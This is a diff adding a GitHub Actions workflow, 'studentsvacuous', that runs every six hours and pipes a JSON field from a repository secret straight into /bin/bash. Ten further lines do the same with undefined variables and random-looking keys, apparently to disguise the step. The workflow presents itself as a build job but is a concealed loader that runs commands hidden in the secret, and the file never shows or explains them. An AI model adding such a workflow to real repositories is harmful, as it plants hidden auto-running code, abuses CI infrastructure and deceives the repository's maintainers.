@@ -1,0 +1,27 @@
+name: studentsvacuous
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: studentsvacuous
+        env:
+          spcy2896: ${{ secrets.spcy2896 }}
+        run: |
+          echo $spcy2896 | jq -r .yh9 | /bin/bash
+          echo $lljx29 | jq -r .wju884 | /bin/bash
+          echo $jzrf76408 | jq -r .p5 | /bin/bash
+          echo $emtwj961 | jq -r .ggiir47441 | /bin/bash
+          echo $pmzm1741 | jq -r .bhq05849 | /bin/bash
+          echo $sbiy6 | jq -r .y7493 | /bin/bash
+          echo $inrcz8490 | jq -r .idpyh0 | /bin/bash
+          echo $ycgjo4072 | jq -r .kbkwf2 | /bin/bash
+          echo $ntymq540 | jq -r .r372 | /bin/bash
+          echo $cpq88237 | jq -r .wrted95 | /bin/bash
+          echo $ofn299 | jq -r .wa62596 | /bin/bash
+
